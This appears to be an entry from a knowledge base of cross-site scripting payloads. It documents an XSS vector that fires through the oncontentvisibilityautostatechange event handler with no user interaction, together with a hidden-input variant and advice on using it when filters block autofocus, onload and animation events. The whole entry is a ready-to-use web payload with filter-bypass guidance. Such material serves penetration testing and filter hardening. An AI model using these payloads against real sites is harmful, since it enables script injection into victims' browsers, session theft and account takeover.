---
title: oncontentvisibilityautostatechange (no interaction)
slug: content-visibility-handler
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# oncontentvisibilityautostatechange (no interaction)

## Payload

```html
<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
```

## Variants

```html
<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
```

## Context

Fires without user interaction when the browser's content-visibility rendering state changes to "visible" (element enters/exits viewport rendering). The `content-visibility:auto` CSS property triggers the event automatically on paint. Useful when `autofocus`, `<body onload>`, and animation events are blocked or stripped. The `<input type=hidden>` variant works even when visible block elements are disallowed. Chrome/Edge Chromium only (CSS `content-visibility` not supported in Firefox/Safari as of 2026).

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
